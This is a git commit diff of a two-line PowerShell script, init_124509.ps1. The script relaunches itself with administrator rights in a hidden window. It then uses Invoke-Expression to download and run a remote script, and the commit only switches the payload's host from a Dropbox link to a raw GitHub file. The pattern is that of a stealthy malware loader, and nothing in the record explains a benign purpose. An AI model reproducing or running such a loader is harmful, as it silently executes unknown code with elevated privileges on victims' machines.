7ff5273c62ec1c1960faa10db0cefa211195cbf7
tameval <114147355+tameval@users.noreply.github.com>
2022-10-20 18:29:12 +0900

    Update init_124509.ps1

--- init_124509.ps1
+++ init_124509.ps1
@@ -1,2 +1,2 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://dl.dropboxusercontent.com/s/hs11erf4nl0zuku/laza.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/body_124509')"
